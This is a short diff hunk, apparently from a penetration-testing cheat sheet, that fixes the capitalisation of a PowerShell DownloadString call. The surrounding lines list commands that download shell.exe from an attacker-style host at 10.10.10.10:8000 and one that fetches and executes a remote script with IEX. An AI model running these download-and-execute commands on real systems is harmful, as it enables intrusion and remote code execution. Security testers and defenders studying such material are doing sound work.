@@ -154,7 +154,7 @@ Invoke-WebRequest http://10.10.10.10:8000/shell.exe -OutFile shell.exe
 
 powershell "(new-object System.Net.WebClient).Downloadfile('http://10.10.10.10:8000/shell.exe', 'shell.exe')"
 
-powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10:8000/something.ps1')"
+powershell "IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10:8000/something.ps1')"
 ```
 via SMB:
 ```
